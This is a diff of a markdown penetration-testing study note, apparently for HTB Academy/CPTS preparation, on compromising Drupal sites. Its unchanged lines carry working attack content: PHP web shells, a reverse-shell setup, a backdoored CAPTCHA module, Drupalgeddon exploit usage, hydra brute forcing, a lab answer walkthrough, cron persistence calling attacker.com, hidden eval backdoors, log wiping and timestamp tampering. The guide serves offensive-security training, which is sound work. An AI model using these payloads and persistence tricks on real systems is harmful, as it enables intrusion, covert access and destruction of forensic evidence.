@@ -7,18 +7,20 @@
 Drupal exploitation presents unique challenges compared to WordPress and Joomla, requiring specialized techniques due to its **security-hardened architecture**. Unlike simpler CMS platforms, Drupal lacks direct theme file editing capabilities, necessitating alternative attack vectors through **PHP filter modules**, **backdoored module uploads**, and **core vulnerabilities**. This guide covers systematic exploitation from administrative access through complete system compromise.
 
 **Primary Attack Vectors:**
-- **🐘 PHP Filter Module** - Code execution via content creation (Drupal 6/7)
-- **📦 Backdoored Module Upload** - Malicious module deployment for persistence
-- **💥 Drupalgeddon Series** - Core vulnerability exploitation (CVE-2014-3704, CVE-2018-7600, CVE-2018-7602)
-- **🔐 Administrative Abuse** - Built-in functionality exploitation
 
----
+* **🐘 PHP Filter Module** - Code execution via content creation (Drupal 6/7)
+* **📦 Backdoored Module Upload** - Malicious module deployment for persistence
+* **💥 Drupalgeddon Series** - Core vulnerability exploitation (CVE-2014-3704, CVE-2018-7600, CVE-2018-7602)
+* **🔐 Administrative Abuse** - Built-in functionality exploitation
+
+***
 
 ## PHP Filter Module Exploitation
 
 ### Understanding PHP Filter Module
 
 #### Module Functionality & Versions
+
 ```bash
 # PHP Filter Module Overview:
 # Purpose: "Allows embedded PHP code/snippets to be evaluated"
@@ -32,6 +34,7 @@ Drupal 8.x+   → PHP Filter must be manually installed
 ```
 
 #### Security Implications
+
 ```bash
 # Why PHP Filter is dangerous:
 1. Direct PHP code execution in content
@@ -44,6 +47,7 @@ Drupal 8.x+   → PHP Filter must be manually installed
 ### Drupal 7 PHP Filter Exploitation
 
 #### Step 1: Administrative Access Verification
+
 ```bash
 # Verify admin access to target
 curl -c cookies.txt -d "name=admin&pass=password&form_id=user_login" \
@@ -54,13 +58,16 @@ curl -b cookies.txt "http://drupal-qa.inlanefreight.local/admin" | grep -i "admi
 ```
 
 #### Step 2: PHP Filter Module Activation
+
 **Navigation Path:**
+
 1. **Administration** → **Modules** (`/admin/modules`)
 2. **Find "PHP filter" module** in Filter section
 3. **Enable checkbox** next to "PHP filter"
 4. **Save configuration** at bottom of page
 
 **Manual Verification:**
+
 ```bash
 # Check if PHP filter is enabled
 curl -b cookies.txt "http://drupal-qa.inlanefreight.local/admin/modules" | grep -i "php filter"
@@ -70,7 +77,9 @@ curl -b cookies.txt "http://drupal-qa.inlanefreight.local/admin/modules" | grep 
 ```
 
 #### Step 3: Malicious Content Creation
+
 **Navigation Path:**
+
 1. **Content** → **Add content** (`/node/add`)
 2. **Basic page** (for static content creation)
 3. **Title:** Any legitimate-sounding title
@@ -78,6 +87,7 @@ curl -b cookies.txt "http://drupal-qa.inlanefreight.local/admin/modules" | grep 
 5. **Text format:** **PHP code** (critical setting)
 
 **PHP Payload Examples:**
+
 ```php
 # Professional web shell (recommended)
 <?php
@@ -108,6 +118,7 @@ if (isset($_GET['data'])) {
 ```
 
 #### Step 4: Payload Execution & Testing
+
 ```bash
 # Test code execution (assuming node/3 was created)
 curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"
@@ -126,6 +137,7 @@ curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf3
 ```
 
 #### Step 5: Reverse Shell Establishment
+
 ```bash
 # Setup listener on attacking machine
 nc -nvlp 4444
@@ -143,6 +155,7 @@ curl -s "http://drupal-qa.inlanefreight.local/node/3" --data-urlencode "dcfdd5e0
 ### Drupal 8+ PHP Filter Installation
 
 #### Manual PHP Filter Module Installation
+
 ```bash
 # Download PHP Filter module for Drupal 8+
 wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
@@ -152,18 +165,22 @@ tar -xzf php-8.x-1.1.tar.gz
 ```
 
 #### Installation via Admin Interface
+
 **Navigation Path:**
+
 1. **Administration** → **Reports** → **Available updates** (`/admin/reports/updates/install`)
 2. **Install new module** section
 3. **Upload archive file** → Browse to downloaded tar.gz
 4. **Install** button to upload and activate
 
 **Alternative URL Method:**
+
 1. **Installation page** → **Install from a URL**
 2. **URL:** `https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
 3. **Install** to download and activate automatically
 
 #### Post-Installation Configuration
+
 ```bash
 # Navigate to Content → Add content → Basic page
 # Ensure "PHP code" appears in Text format dropdown
@@ -173,13 +190,14 @@ tar -xzf php-8.x-1.1.tar.gz
 curl -b cookies.txt "http://target.com/admin/config/content/formats" | grep -i "php"
 ```
 
----
+***
 
 ## Backdoored Module Upload Exploitation
 
 ### Understanding Drupal Module Architecture
 
 #### Module Structure Analysis
+
 ```bash
 # Standard Drupal module components:
 module_name/
@@ -192,6 +210,7 @@ module_name/
 ```
 
 #### Module Upload Requirements
+
 ```bash
 # Prerequisites for module upload:
 1. Administrative access to Drupal
@@ -203,6 +222,7 @@ module_name/
 ### Creating Backdoored CAPTCHA Module
 
 #### Step 1: Base Module Download
+
 ```bash
 # Download legitimate CAPTCHA module
 wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
@@ -216,6 +236,7 @@ ls -la
 ```
 
 #### Step 2: Web Shell Creation
+
 ```php
 # Create shell.php in module directory
 cat > shell.php << 'EOF'
@@ -236,6 +257,7 @@ EOF
 ```
 
 #### Step 3: .htaccess Configuration
+
 ```apache
 # Create .htaccess for module access
 cat > .htaccess << 'EOF'
@@ -252,6 +274,7 @@ EOF
 ```
 
 #### Step 4: Module Repackaging
+
 ```bash
 # Move backdoor files into module directory
 mv shell.php .htaccess captcha/
@@ -264,13 +287,16 @@ tar -tzf captcha-backdoored.tar.gz | grep -E "(shell\.php|\.htaccess)"
 ```
 
 #### Step 5: Administrative Upload
+
 **Navigation Path:**
+
 1. **Manage** → **Extend** (`/admin/modules`)
 2. **+ Install new module** button
 3. **Browse** → Select `captcha-backdoored.tar.gz`
 4. **Install** to upload and activate
 
 **Post-Installation Verification:**
+
 ```bash
 # Test web shell access
 curl -s "http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
@@ -286,6 +312,7 @@ curl -s "http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22
 ### Advanced Backdoored Module Techniques
 
 #### Stealth Module Modification
+
 ```php
 # Inject backdoor into existing module functionality
 # Modify captcha/captcha.module
@@ -306,6 +333,7 @@ if (isset($_GET['maintenance']) && $_GET['maintenance'] === 'debug_mode') {
 ```
 
 #### Database-Triggered Backdoors
+
 ```php
 # Create database-triggered backdoor in module installation
 # Add to captcha/captcha.install
@@ -324,13 +352,14 @@ function captcha_install() {
 }
 ```
 
----
+***
 
 ## Drupalgeddon Vulnerability Series
 
 ### CVE-2014-3704: Drupalgeddon 1 (SQL Injection)
 
 #### Vulnerability Details
+
 ```bash
 # CVE-2014-3704 Overview:
 Affected Versions: Drupal 7.0 - 7.31
@@ -343,6 +372,7 @@ Impact: Remote code execution, admin user creation
 #### Manual Exploitation Process
 
 **Vulnerability Mechanism:**
+
 ```bash
 # SQL injection in user registration form
 # Malicious arrays bypass input sanitization
@@ -351,6 +381,7 @@ Impact: Remote code execution, admin user creation
 ```
 
 **Exploit Script Usage:**
+
 ```bash
 # Download Drupalgeddon exploit
 wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon/master/drupalgeddon.py
@@ -367,6 +398,7 @@ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p p
 ```
 
 **Post-Exploitation Steps:**
+
 ```bash
 # 1. Login with created admin account
 curl -c cookies.txt -d "name=hacker&pass=pwnd&form_id=user_login" \
@@ -380,6 +412,7 @@ curl -c cookies.txt -d "name=hacker&pass=pwnd&form_id=user_login" \
 ```
 
 #### Metasploit Integration
+
 ```bash
 # Use Metasploit module
 msfconsole
@@ -394,6 +427,7 @@ exploit
 ### CVE-2018-7600: Drupalgeddon 2 (RCE)
 
 #### Vulnerability Details
+
 ```bash
 # CVE-2018-7600 Overview:
 Affected Versions: Drupal 6.x, 7.x, 8.x (prior to 7.58, 8.5.1)
@@ -406,6 +440,7 @@ Mechanism: Insufficient input sanitization in user registration
 #### Manual Exploitation
 
 **Basic PoC Execution:**
+
 ```bash
 # Download Drupalgeddon2 exploit
 wget https://raw.githubusercontent.com/a2u/CVE-2018-7600/master/drupalgeddon2.py
@@ -420,6 +455,7 @@ curl -s http://drupal-dev.inlanefreight.local/hello.txt
 ```
 
 **PHP Web Shell Upload:**
+
 ```bash
 # Create malicious PHP payload
 echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
@@ -438,6 +474,7 @@ curl "http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd2
 ```
 
 **Advanced Payload Deployment:**
+
 ```bash
 # Multi-stage payload for stealth
 # Stage 1: Upload minimal dropper
@@ -454,6 +491,7 @@ curl "http://target.com/config.php?cmd=whoami"
 ### CVE-2018-7602: Drupalgeddon 3 (Authenticated RCE)
 
 #### Vulnerability Details
+
 ```bash
 # CVE-2018-7602 Overview:
 Affected Versions: Drupal 7.x, 8.x (multiple versions)
@@ -466,6 +504,7 @@ Mechanism: Form API validation bypass
 #### Prerequisites & Session Management
 
 **Obtaining Valid Session:**
+
 ```bash
 # Method 1: Credential brute force
 hydra -l admin -P /usr/share/wordlists/rockyou.txt drupal-acc.inlanefreight.local http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:Sorry"
@@ -478,6 +517,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt drupal-acc.inlanefreight.loca
 ```
 
 **Session Cookie Extraction:**
+
 ```bash
 # Login and capture session
 curl -c cookies.txt -d "name=admin&pass=password&form_id=user_login" \
@@ -491,6 +531,7 @@ grep SESS cookies.txt | awk '{print $7}'
 #### Metasploit Exploitation
 
 **Module Configuration:**
+
 ```bash
 msfconsole
 use exploit/multi/http/drupal_drupageddon3
@@ -510,6 +551,7 @@ show options
 ```
 
 **Exploitation Execution:**
+
 ```bash
 # Execute exploit
 exploit
@@ -530,16 +572,18 @@ Computer    : app01
 OS          : Linux app01 5.4.0-81-generic
 ```
 
----
+***
 
 ## HTB Academy Lab Solutions
 
 ### Lab: Multi-Vector Drupal RCE Challenge
+
 **Question:** "Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory."
 
 **Comprehensive Solution Methodology:**
 
 #### Step 1: Environment Setup & Target Analysis
+
 ```bash
 # Add required VHost entries
 echo "10.129.243.75 drupal-qa.inlanefreight.local" >> /etc/hosts
@@ -560,6 +604,7 @@ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt | head -n 3
 #### Step 2: Method 1 - PHP Filter Module (drupal-qa)
 
 **Vulnerability Assessment:**
+
 ```bash
 # Target: drupal-qa.inlanefreight.local
 # Expected: Drupal 7.x with potential admin access
@@ -573,6 +618,7 @@ curl -b cookies.txt "http://drupal-qa.inlanefreight.local/admin" | grep -i "admi
 ```
 
 **PHP Filter Exploitation:**
+
 ```bash
 # Navigate to: /admin/modules
 # Enable "PHP filter" module
@@ -595,6 +641,7 @@ curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf3
 #### Step 3: Method 2 - Drupalgeddon 2 (drupal-dev)
 
 **CVE-2018-7600 Exploitation:**
+
 ```bash
 # Target: drupal-dev.inlanefreight.local
 # Unauthenticated RCE vulnerability
@@ -624,6 +671,7 @@ curl "http://drupal-dev.inlanefreight.local/shell.php?fe8edbabc5c5c9b7b764504cd2
 #### Step 4: Method 3 - Drupalgeddon 1 (Admin Creation)
 
 **CVE-2014-3704 Exploitation:**
+
 ```bash
 # Target: drupal-qa.inlanefreight.local (if vulnerable to both)
 # Or any Drupal 7.0-7.31 instance
@@ -644,6 +692,7 @@ curl -c cookies2.txt -d "name=hacker&pass=pwnd&form_id=user_login" \
 #### Step 5: Method 4 - Backdoored Module Upload
 
 **CAPTCHA Module Backdoor:**
+
 ```bash
 # Download legitimate CAPTCHA module
 wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
@@ -672,6 +721,7 @@ curl "http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17
 #### Step 6: Flag Discovery & Submission
 
 **Systematic Flag Search:**
+
 ```bash
 # Search all possible flag locations
 locations=(
@@ -696,13 +746,14 @@ curl -s "http://[COMPROMISED_HOST]/[SHELL_PATH]?[PARAM]=find+/var/www+-name+'*fl
 curl -s "http://[COMPROMISED_HOST]/[SHELL_PATH]?[PARAM]=cat+/var/www/drupal.inlanefreight.local/flag.txt"
 ```
 
----
+***
 
 ## Advanced Exploitation Techniques
 
 ### Persistent Access Methods
 
 #### Database-Level Persistence
+
 ```bash
 # Access Drupal database via compromised shell
 curl "http://target.com/shell.php?cmd=cat+/var/www/html/sites/default/settings.php" | grep database
@@ -722,6 +773,7 @@ SELECT uid, 3 FROM users WHERE name = 'sysadmin';
 ```
 
 #### Crontab Persistence
+
 ```bash
 # Establish cron-based backdoor
 curl "http://target.com/shell.php?cmd=echo+'*/5+*+*+*+*+wget+-q+-O-+http://attacker.com/beacon+>+/dev/null'+|+crontab+-"
@@ -731,6 +783,7 @@ curl "http://target.com/shell.php?cmd=systemctl+--user+enable+backdoor.timer"
 ```
 
 #### File System Persistence
+
 ```bash
 # Hide backdoor in Drupal cache directory
 curl "http://target.com/shell.php?cmd=echo+'<?php+eval(\$_GET[x]);?>'+>+/var/www/html/sites/default/files/.cache.php"
@@ -743,6 +796,7 @@ curl "http://target.com/shell.php?cmd=chmod+u+s+/tmp/.system-update"
 ### Defense Evasion Techniques
 
 #### Log Cleaning & Anti-Forensics
+
 ```bash
 # Clear web server access logs
 curl "http://target.com/shell.php?cmd=echo+''>/var/log/apache2/access.log"
@@ -758,6 +812,7 @@ curl "http://target.com/shell.php?cmd=unset+HISTFILE"
 ```
 
 #### Timestamp Manipulation
+
 ```bash
 # Preserve original file timestamps
 curl "http://target.com/shell.php?cmd=stat+/var/www/html/index.php"
@@ -767,13 +822,14 @@ curl "http://target.com/shell.php?cmd=stat+/var/www/html/index.php"
 curl "http://target.com/shell.php?cmd=touch+-t+202301151430.00+/var/www/html/backdoor.php"
 ```
 
----
+***
 
 ## Comprehensive Security Assessment
 
 ### Drupal-Specific Vulnerability Research
 
 #### Core Vulnerability Timeline
+
 ```bash
 # Major Drupal vulnerabilities by version:
 
@@ -799,6 +855,7 @@ Drupal 9.x:
 ```
 
 #### Module-Specific Research
+
 ```bash
 # High-risk contributed modules:
 searchsploit "drupal views"
@@ -817,6 +874,7 @@ searchsploit "drupal media"
 ### Professional Methodology Integration
 
 #### Multi-Vector Assessment Workflow
+
 ```bash
 # Phase 1: Discovery & Enumeration
 1. Version fingerprinting (CHANGELOG.txt, meta tags)
@@ -843,13 +901,14 @@ searchsploit "drupal media"
 16. Network pivoting and lateral movement
 ```
 
----
+***
 
 ## Defensive Considerations
 
 ### Security Hardening Recommendations
 
 #### Core Security Measures
+
 ```bash
 # Essential Drupal security hardening:
 1. Remove/rename update.php after updates
@@ -863,6 +922,7 @@ searchsploit "drupal media"
 ```
 
 #### Module Security Management
+
 ```bash
 # Contributed module security:
 1. Regular module updates via Drush/Composer
@@ -876,6 +936,7 @@ searchsploit "drupal media"
 ### Monitoring and Detection
 
 #### Attack Pattern Recognition
+
 ```bash
 # Monitor for Drupal-specific attacks:
 - CHANGELOG.txt access attempts
@@ -891,6 +952,7 @@ tail -f /var/log/apache2/access.log | grep -E "(drupal|admin|node|php)"
 ```
 
 #### Security Monitoring Implementation
+
 ```bash
 # File integrity monitoring
 find /var/www/drupal/ -name "*.php" -type f -exec md5sum {} \; > drupal_hashes.txt
@@ -902,33 +964,36 @@ mysql -e "CHECKSUM TABLE users, users_roles;" drupal_database
 drush pm-list --status=enabled > enabled_modules.txt
 ```
 
----
+***
 
 ## Cross-Module Integration
 
 ### Integration with Other Attack Vectors
 
 #### File Upload Integration
-- **[File Upload Attacks](../file-upload-attacks/)** - Media module vulnerabilities
-- **[File Inclusion](../file-inclusion/)** - Drupal file handling exploits
 
-#### Database Attack Integration  
-- **[SQL Injection](../databases/)** - Drupalgeddon and Form API attacks
-- **[Database Enumeration](../databases/)** - Settings.php credential extraction
+* [**File Upload Attacks**](../file-upload-attacks/) - Media module vulnerabilities
+* [**File Inclusion**](../file-inclusion/) - Drupal file handling exploits
+
+#### Database Attack Integration
+
+* [**SQL Injection**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/databases/README.md) - Drupalgeddon and Form API attacks
+* [**Database Enumeration**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/databases/README.md) - Settings.php credential extraction
 
 #### Command Injection Integration
-- **[Command Injection](../command-injection/)** - PHP Filter and module RCE
-- **[Web Shells](../shells-payloads/)** - Persistent access techniques
 
----
+* [**Command Injection**](../command-injection/) - PHP Filter and module RCE
+* [**Web Shells**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/shells-payloads/README.md) - Persistent access techniques
+
+***
 
 ## Next Steps
 
 After successful Drupal exploitation:
 
-1. **[Servlet Containers](tomcat-enumeration.md)** - Java application server attacks
-2. **[Development Tools](jenkins-enumeration.md)** - CI/CD infrastructure exploitation  
-3. **[Infrastructure Applications](splunk-enumeration.md)** - Monitoring system attacks
-4. **[Privilege Escalation](../../linux-privilege-escalation/)** - Local system compromise
+1. [**Servlet Containers**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/tomcat-enumeration.md) - Java application server attacks
+2. [**Development Tools**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/jenkins-enumeration.md) - CI/CD infrastructure exploitation
+3. [**Infrastructure Applications**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/splunk-enumeration.md) - Monitoring system attacks
+4. [**Privilege Escalation**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/linux-privilege-escalation/README.md) - Local system compromise
 
-**💡 Key Takeaway:** Drupal exploitation requires understanding of **security-hardened architecture**, **module-based attack vectors**, and **historical vulnerability patterns**. Unlike WordPress/Joomla, Drupal's enterprise focus demands specialized techniques including **PHP filter abuse**, **backdoored module deployment**, and **Drupalgeddon series exploitation** for successful compromise of critical infrastructure deployments. 
+**💡 Key Takeaway:** Drupal exploitation requires understanding of **security-hardened architecture**, **module-based attack vectors**, and **historical vulnerability patterns**. Unlike WordPress/Joomla, Drupal's enterprise focus demands specialized techniques including **PHP filter abuse**, **backdoored module deployment**, and **Drupalgeddon series exploitation** for successful compromise of critical infrastructure deployments.
